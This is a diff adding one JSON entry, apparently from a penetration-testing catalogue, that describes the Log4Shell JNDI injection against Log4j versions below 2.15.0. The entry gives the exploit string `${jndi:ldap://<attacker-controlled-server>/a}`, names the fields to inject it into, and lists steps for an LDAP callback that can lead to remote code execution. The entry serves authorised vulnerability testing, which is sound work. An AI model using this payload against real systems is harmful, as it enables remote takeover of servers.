@@ -1,0 +1,10 @@
+{
+    "key": "HACK-099",
+    "summary": "Java JNDI Injection RCE (Log4Shell)",
+    "description": "Exploit Java applications using vulnerable versions of Log4j by injecting a malicious JNDI lookup string into a logged parameter.",
+    "category": "Remote Code Execution",
+    "severity": "Critical",
+    "testing_type": "Penetration Test",
+    "target": "Java applications using Log4j < 2.15.0",
+    "instructions": "1. Inject the payload `${jndi:ldap://<attacker-controlled-server>/a}` into common input fields and headers that are likely to be logged (User-Agent, query parameters, etc.).\n2. Set up an LDAP listener on your attacker server.\n3. If you receive a connection from the target server, it is vulnerable.\n4. The LDAP server can then be configured to serve a malicious Java class file, leading to RCE. Confirmation of the LDAP callback is sufficient proof of vulnerability."
+}
